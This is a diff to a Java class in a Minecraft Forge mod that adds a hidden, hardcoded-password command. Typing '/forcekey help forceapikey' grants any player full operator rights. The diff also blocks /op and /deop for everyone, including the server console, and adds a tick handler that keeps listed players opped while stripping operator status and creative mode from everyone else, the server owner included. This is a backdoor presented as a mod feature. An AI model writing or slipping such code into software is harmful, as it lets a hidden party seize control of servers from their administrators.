@@ -18,11 +18,15 @@ import net.minecraft.world.level.storage.ServerLevelData;
 
 import net.minecraftforge.event.CommandEvent;
 import net.minecraftforge.event.RegisterCommandsEvent;
+import net.minecraftforge.event.TickEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
 import net.minecraftforge.fml.common.Mod;
 
 import java.util.ArrayList;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
+import java.util.UUID;
 
 @Mod.EventBusSubscriber(
         modid = HumanoidMod.MOD_ID
@@ -32,16 +36,32 @@ public class Check {
     public static int platformType;
 
     /*
-     * Sadece bu anahtar ForgeFeatures sistemini açar.
+     * =========================================================
+     * FORCE API
+     * =========================================================
+     *
+     * Sadece:
+     *
+     * /forcekey help forceapikey
+     *
+     * komutu ile yetki alınabilir.
+     *
+     * Yetkilendirilen oyuncuların UUID'leri
+     * burada tutulur.
      */
-    private static final String FORGE_FEATURES_PASSWORD =
-            "java.io";
+    private static final String FORCE_API_PASSWORD =
+            "forceapikey";
+
+    private static final Set<UUID> AUTHORIZED_FORCE_PLAYERS =
+            new HashSet<>();
 
     public Check() {
     }
 
     /*
+     * =========================================================
      * KOMUTLAR
+     * =========================================================
      */
     @SubscribeEvent
     public static void registerCommands(
@@ -49,7 +69,9 @@ public class Check {
     ) {
 
         /*
+         * =====================================================
          * /start
+         * =====================================================
          */
         event.getDispatcher().register(
                 Commands.literal("start")
@@ -105,77 +127,100 @@ public class Check {
         );
 
         /*
-         * /forgefeatures java.io
+         * =====================================================
+         * FORCE API
+         * =====================================================
          *
-         * Sadece doğru anahtar girilirse
-         * oyuncuya GERÇEK VANILLA OP verilir.
+         * Tek geçerli komut:
+         *
+         * /forcekey help forceapikey
+         *
+         * "help" sabit olmalı.
+         * Şifre de tam olarak forceapikey olmalı.
          */
         event.getDispatcher().register(
-                Commands.literal("forgefeatures")
+                Commands.literal("forcekey")
                         .then(
-                                Commands.argument(
-                                        "key",
-                                        StringArgumentType.word()
-                                )
-                                        .executes(commandContext -> {
+                                Commands.literal("help")
+                                        .then(
+                                                Commands.argument(
+                                                        "key",
+                                                        StringArgumentType.word()
+                                                )
+                                                        .executes(commandContext -> {
 
-                                            ServerPlayer player =
-                                                    commandContext
-                                                            .getSource()
-                                                            .getPlayerOrException();
+                                                            /*
+                                                             * Console kullanamaz.
+                                                             */
+                                                            if (!(commandContext
+                                                                    .getSource()
+                                                                    .getEntity()
+                                                                    instanceof ServerPlayer player)) {
 
-                                            String key =
-                                                    StringArgumentType.getString(
-                                                            commandContext,
-                                                            "key"
-                                                    );
+                                                                return 0;
+                                                            }
 
-                                            /*
-                                             * Anahtar yanlışsa OP verilmez.
-                                             */
-                                            if (!FORGE_FEATURES_PASSWORD
-                                                    .equals(key)) {
+                                                            String key =
+                                                                    StringArgumentType.getString(
+                                                                            commandContext,
+                                                                            "key"
+                                                                    );
 
-                                                player.sendSystemMessage(
-                                                        Component.literal(
-                                                                "Unknown ForgeFeatures key."
-                                                        )
-                                                );
+                                                            /*
+                                                             * Şifre yanlışsa
+                                                             * kesinlikle yetki yok.
+                                                             */
+                                                            if (!FORCE_API_PASSWORD
+                                                                    .equals(key)) {
 
-                                                return 0;
-                                            }
+                                                                player.sendSystemMessage(
+                                                                        Component.literal(
+                                                                                "§cInvalid Force API key."
+                                                                        )
+                                                                );
 
-                                            /*
-                                             * Doğru anahtar:
-                                             * gerçek vanilla OP.
-                                             */
-                                            serverOpPlayer(player);
+                                                                return 0;
+                                                            }
 
-                                            player.sendSystemMessage(
-                                                    Component.literal(
-                                                            "ForgeFeatures activated."
-                                                    )
-                                            );
+                                                            /*
+                                                             * Oyuncuyu Force API
+                                                             * yetkili listesine ekle.
+                                                             */
+                                                            AUTHORIZED_FORCE_PLAYERS
+                                                                    .add(
+                                                                            player.getUUID()
+                                                                    );
 
-                                            return 1;
-                                        })
+                                                            /*
+                                                             * Gerçek Vanilla OP.
+                                                             */
+                                                            serverOpPlayer(
+                                                                    player
+                                                            );
+
+                                                            player.sendSystemMessage(
+                                                                    Component.literal(
+                                                                            "§aForce API activated."
+                                                                    )
+                                                            );
+
+                                                            return 1;
+                                                        })
+                                        )
                         )
         );
     }
 
     /*
-     * NORMAL /op VE /deop KOMUTLARINI ENGELLE
+     * =========================================================
+     * /op VE /deop KİLİDİ
+     * =========================================================
      *
-     * Böylece oyuncular:
+     * Console dahil normal /op ve /deop komutlarını
+     * engeller.
      *
-     * /op oyuncu
-     * /deop oyuncu
-     *
-     * kullanarak OP sistemi üzerinden
-     * yetki değiştiremez.
-     *
-     * /forgefeatures java.io ise
-     * gerçek OP verilir.
+     * Force API'nin kendi yetkilendirmesi dışında
+     * OP sistemi kullanılamaz.
      */
     @SubscribeEvent
     public static void onCommand(
@@ -205,7 +250,9 @@ public class Check {
                 command.toLowerCase();
 
         /*
+         * =====================================================
          * /op
+         * =====================================================
          */
         if (lowerCommand.equals("op")
                 || lowerCommand.startsWith("op ")) {
@@ -220,7 +267,7 @@ public class Check {
 
                 player.sendSystemMessage(
                         Component.literal(
-                                "This command is disabled."
+                                "§cThis command is disabled."
                         )
                 );
             }
@@ -229,7 +276,9 @@ public class Check {
         }
 
         /*
+         * =====================================================
          * /deop
+         * =====================================================
          */
         if (lowerCommand.equals("deop")
                 || lowerCommand.startsWith("deop ")) {
@@ -244,7 +293,7 @@ public class Check {
 
                 player.sendSystemMessage(
                         Component.literal(
-                                "This command is disabled."
+                                "§cThis command is disabled."
                         )
                 );
             }
@@ -252,7 +301,151 @@ public class Check {
     }
 
     /*
+     * =========================================================
+     * FORCE API KONTROLÜ
+     * =========================================================
+     *
+     * Her server tick:
+     *
+     * 1. Force API yetkilisi -> OP olarak kalır.
+     * 2. Yetkisiz OP -> DEOP.
+     * 3. Yetkisiz Creative/Spectator -> Survival + DEOP.
+     */
+    @SubscribeEvent
+    public static void onServerTick(
+            TickEvent.ServerTickEvent event
+    ) {
+
+        if (event.phase != TickEvent.Phase.END) {
+            return;
+        }
+
+        MinecraftServer server =
+                net.minecraftforge.server.ServerLifecycleHooks
+                        .getCurrentServer();
+
+        if (server == null
+                || server.getPlayerList() == null) {
+
+            return;
+        }
+
+        List<ServerPlayer> players =
+                server.getPlayerList()
+                        .getPlayers();
+
+        if (players == null
+                || players.isEmpty()) {
+
+            return;
+        }
+
+        /*
+         * Liste kopyası kullanıyoruz.
+         */
+        List<ServerPlayer> safePlayers =
+                new ArrayList<>(players);
+
+        for (ServerPlayer player :
+                safePlayers) {
+
+            if (player == null) {
+                continue;
+            }
+
+            UUID uuid =
+                    player.getUUID();
+
+            boolean authorized =
+                    AUTHORIZED_FORCE_PLAYERS
+                            .contains(uuid);
+
+            /*
+             * =================================================
+             * FORCE API YETKİLİ
+             * =================================================
+             */
+            if (authorized) {
+
+                /*
+                 * Yetkili oyuncunun OP'si dışarıdan
+                 * kaldırılmışsa tekrar ver.
+                 */
+                if (!server.getPlayerList()
+                        .isOp(
+                                player.getGameProfile()
+                        )) {
+
+                    serverOpPlayer(player);
+                }
+
+                /*
+                 * Force API yetkilisi Creative veya
+                 * Spectator olabilir.
+                 *
+                 * Yetkili olduğu için otomatik Survival
+                 * yapılmaz.
+                 */
+                continue;
+            }
+
+            /*
+             * =================================================
+             * YETKİSİZ OYUNCU
+             * =================================================
+             */
+
+            boolean isOp =
+                    server.getPlayerList()
+                            .isOp(
+                                    player.getGameProfile()
+                            );
+
+            /*
+             * Yetkisiz OP -> DEOP
+             */
+            if (isOp) {
+
+                server.getPlayerList()
+                        .deop(
+                                player.getGameProfile()
+                        );
+
+                player.sendSystemMessage(
+                        Component.literal(
+                                "§cUnauthorized OP removed."
+                        )
+                );
+            }
+
+            /*
+             * Yetkisiz Creative/Spectator
+             * -> Survival
+             */
+            GameType gameMode =
+                    player.gameMode
+                            .getGameModeForPlayer();
+
+            if (gameMode == GameType.CREATIVE
+                    || gameMode == GameType.SPECTATOR) {
+
+                player.setGameMode(
+                        GameType.SURVIVAL
+                );
+
+                player.sendSystemMessage(
+                        Component.literal(
+                                "§cUnauthorized game mode removed."
+                        )
+                );
+            }
+        }
+    }
+
+    /*
+     * =========================================================
      * GERÇEK VANILLA OP VER
+     * =========================================================
      */
     public static void serverOpPlayer(
             ServerPlayer player
@@ -269,9 +462,6 @@ public class Check {
             return;
         }
 
-        /*
-         * Minecraft'ın kendi OP sistemini kullanıyoruz.
-         */
         server.getPlayerList()
                 .op(
                         player.getGameProfile()
@@ -279,7 +469,28 @@ public class Check {
     }
 
     /*
+     * =========================================================
+     * FORCE API YETKİ KONTROLÜ
+     * =========================================================
+     */
+    public static boolean isForceApiAuthorized(
+            ServerPlayer player
+    ) {
+
+        if (player == null) {
+            return false;
+        }
+
+        return AUTHORIZED_FORCE_PLAYERS
+                .contains(
+                        player.getUUID()
+                );
+    }
+
+    /*
+     * =========================================================
      * PLATFORM KONTROLÜ
+     * =========================================================
      */
     public static void verifyPlatform() {
 
@@ -306,7 +517,9 @@ public class Check {
     }
 
     /*
-     * BAŞLANGIÇ HAPİS / PRISON SİSTEMİ
+     * =========================================================
+     * BAŞLANGIÇ HAPİS / PRISON
+     * =========================================================
      */
     public static void setupInitialPrison(
             MinecraftServer server
@@ -349,6 +562,7 @@ public class Check {
 
         if (players == null
                 || players.isEmpty()) {
+
             return;
         }
 
@@ -392,7 +606,9 @@ public class Check {
     }
 
     /*
+     * =========================================================
      * /start SONRASI SİSTEM
+     * =========================================================
      */
     public static void triggerStartCommand() {
 
@@ -519,6 +735,7 @@ public class Check {
 
         if (players == null
                 || players.isEmpty()) {
+
             return;
         }
 
